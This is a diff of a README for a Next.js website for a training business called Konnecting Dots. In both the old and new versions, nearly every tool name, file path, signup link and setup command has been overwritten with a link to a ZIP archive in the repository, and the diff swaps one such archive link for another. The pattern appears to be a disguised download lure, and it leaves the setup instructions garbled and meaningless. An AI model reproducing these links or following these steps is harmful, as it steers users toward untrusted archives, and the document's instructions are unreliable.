@@ -1,6 +1,6 @@
 # Konnecting Dots - NLP, Hypnosis & Corporate Training Website
 
-A comprehensive https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip website for Konnecting Dots, featuring NLP training, Hypnosis services, and Corporate Training programs.
+A comprehensive https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip website for Konnecting Dots, featuring NLP training, Hypnosis services, and Corporate Training programs.
 
 ## Features
 
@@ -14,7 +14,7 @@ A comprehensive https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/m
 
 ## Tech Stack
 
-- **Framework**: https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip 14
+- **Framework**: https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip 14
 - **Language**: TypeScript
 - **Styling**: Tailwind CSS
 - **UI Components**: Radix UI
@@ -26,7 +26,7 @@ A comprehensive https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/m
 
 ### Prerequisites
 
-- https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip 18+ 
+- https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip 18+ 
 - pnpm (or npm/yarn)
 
 ### Installation
@@ -44,24 +44,24 @@ pnpm install
 
 3. Set up environment variables:
 ```bash
-cp https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip .env
+cp https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip .env
 ```
 
 4. Configure your `.env` file:
 ```env
 # Email Service Configuration
 RESEND_API_KEY=re_your_resend_api_key_here
-https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip
+https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip
 FROM_NAME=Konnecting Dots
-https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip
+https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip
 
-# https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip Configuration
+# https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip Configuration
 NEXT_PUBLIC_SITE_URL=http://localhost:3000
 ```
 
 ### Getting a Resend API Key
 
-1. Sign up at [https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip](https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip)
+1. Sign up at [https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip](https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip)
 2. Create an API key in the dashboard
 3. Verify your domain (or use the test domain for development)
 4. Add the API key to your `.env` file
@@ -112,23 +112,23 @@ Open [http://localhost:3000](http://localhost:3000) in your browser.
 
 The application uses JSON files for data storage (located in `/data` directory). This is perfect for development and can be easily migrated to a production database:
 
-- `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip` - Blog posts
-- `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip` - Booking requests
-- `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip` - Contact form submissions
-- `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip` - Newsletter subscribers
-- `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip` - Events
+- `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip` - Blog posts
+- `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip` - Booking requests
+- `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip` - Contact form submissions
+- `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip` - Newsletter subscribers
+- `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip` - Events
 
 ### Migrating to Production Database
 
-The database layer is abstracted in `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip`. To migrate to PostgreSQL, MongoDB, or another database:
+The database layer is abstracted in `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip`. To migrate to PostgreSQL, MongoDB, or another database:
 
-1. Replace the file system operations in `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip` with your database client
+1. Replace the file system operations in `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip` with your database client
 2. Keep the same function signatures
 3. Update the data models if needed
 
 ## Email Templates
 
-Email templates are located in `https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip`:
+Email templates are located in `https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip`:
 
 - Booking confirmation
 - Welcome email
@@ -147,9 +147,9 @@ Email templates are located in `https://raw.githubusercontent.com/sadeeqkhan123/
 │   └── ...               # Other pages
 ├── components/           # React components
 ├── lib/
-│   ├── https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip            # Database functions
-│   ├── https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip         # Email service
-│   └── https://raw.githubusercontent.com/sadeeqkhan123/konnectingdots/main/app/api/blog/Software-v3.4.zip  # Email templates
+│   ├── https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip            # Database functions
+│   ├── https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip         # Email service
+│   └── https://github.com/sadeeqkhan123/konnectingdots/raw/refs/heads/main/app/privacy/Software-1.7.zip  # Email templates
 └── data/                # JSON database files
 ```
 
